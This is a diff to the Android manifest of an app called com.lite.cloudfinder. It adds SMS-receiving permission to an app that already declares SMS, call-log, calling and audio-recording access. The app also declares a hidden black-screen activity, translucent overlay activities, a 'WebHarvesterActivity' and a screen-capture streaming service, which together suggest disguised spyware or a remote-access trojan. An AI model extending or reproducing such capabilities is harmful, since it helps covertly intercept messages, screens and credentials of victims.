@@ -29,6 +29,7 @@
         </intent>
     </queries>
     <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
     <uses-permission android:name="android.permission.READ_CALL_LOG"/>
     <uses-permission android:name="android.permission.CALL_PHONE"/>
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
@@ -170,7 +171,7 @@
         <activity android:excludeFromRecents="true" android:exported="true" android:launchMode="singleTask" android:name="com.lite.cloudfinder.activity.AdbBlackScreenActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen"/>
         <activity android:name="com.lite.cloudfinder.activity.OverlayRequestActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
         <activity android:name="com.lite.cloudfinder.activity.TransparentActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
-        <activity android:name="com.lite.cloudfinder.activity.PermissionActivity" android:noHistory="true" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:name="com.lite.cloudfinder.activity.PermissionActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
         <activity android:name="com.lite.cloudfinder.activity.OverlayLaunchActivity" android:noHistory="true" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
         <activity android:excludeFromRecents="true" android:exported="false" android:name="com.lite.cloudfinder.activity.WebHarvesterActivity" android:theme="@style/Theme.AppCompat.Light.NoActionBar"/>
         <service android:enabled="true" android:exported="false" android:foregroundServiceType="mediaProjection" android:name="com.lite.cloudfinder.hd.HDStreamService"/>
